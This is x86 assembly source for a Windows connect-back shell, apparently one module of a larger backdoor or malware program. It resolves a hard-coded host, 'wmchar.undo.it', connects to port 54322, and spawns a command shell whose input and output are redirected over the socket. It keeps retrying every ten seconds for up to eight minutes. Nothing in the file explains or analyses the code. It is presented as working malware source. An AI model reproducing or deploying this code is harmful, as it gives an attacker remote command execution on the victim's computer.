CPU 386
[BITS 32]

section .rdata

CBACK_HOST	DB	'wmchar.undo.it',0


section .text execute

%xdefine		CBACK_TIMEOUT	((8*60)*1000)	;8 min.
%xdefine		CBACK_CHK_CONN	(10*1000)	;10 sec.
%xdefine		CBACK_PORT	54322



@Cback:
	mov ebp, esp
	sub esp, 0x10

%define		_WSASocket	[ebp - 4]

	push 0
	push DWORD [MTX_CBACK]
	call WaitForSingleObject
	or eax, eax
	jnz .exit

	mov esi, STR_WS2_32
	push esi
	call GetModuleHandle
	or eax, eax
	jnz .ws2

	push esi
	call LoadLibrary
	or eax, eax
	jz .exit

.ws2
	push STR_WSASocket
	push eax
	call GetProcAddress
	or eax, eax
	jz .exit

	mov _WSASocket, eax

.gethost
	push CBACK_HOST
	call gethostbyname
	or eax, eax
	jz .exit

	mov esi, [eax + 0xC]
	lodsd
	mov eax, [eax]

	xor edx, edx
	push edx
	push edx
	push eax		;ip
	push DWORD (2 | ((((CBACK_PORT << 8) & 0xFF00) | ((CBACK_PORT >> 8) & 0xFF)) << 16)  )

	push edx
	push edx
	push edx
	push edx
	push byte 1
	push byte 2
	call DWORD _WSASocket
	xchg ebx, eax

	mov edx, esp
	push byte 0x10
	push edx
	push ebx
	call connect
	add esp, byte 0x10
	or eax, eax
	jz .createprocess

.retry
	push ebx
	call closesocket

	push byte (CBACK_TIMEOUT / CBACK_CHK_CONN)
	pop ecx

.sleep
	push ecx
	push CBACK_CHK_CONN
	call Sleep
	pop ecx
	cmp DWORD [CONNECTED], 0
	je .exit

	loop .sleep
	jmp short .gethost

.exit
	push DWORD [MTX_CBACK]
	call ReleaseMutex

	push BYTE 0
	call ExitThread


.createprocess
	push byte 0x11
	pop ecx
	mov edx, edi
	mov edi, esp
	lea esi, [edi + 0x44]
	push esi
	push edi

	push edi
	rep stosd
	pop edi

	mov byte [edi], 0x44
	inc byte [edi + 0x2c]	;STARTF_USESHOWWINDOW
	inc byte [edi + 0x2d]	;STARTF_USESTDHANDLES
	lea edi, [edi + 0x38]
	mov eax, ebx
	stosd
	stosd
	stosd
	mov edi, edx
	push ecx
	push ecx
	push ecx
	push eax	;TRUE
	push ecx
	push ecx
	push STR_CMD
	push ecx
	call CreateProcess

	lodsd
	push eax
	push byte -1
	push eax
	call WaitForSingleObject

	call CloseHandle
	push DWORD [esi]
	call CloseHandle

	jmp short .retry
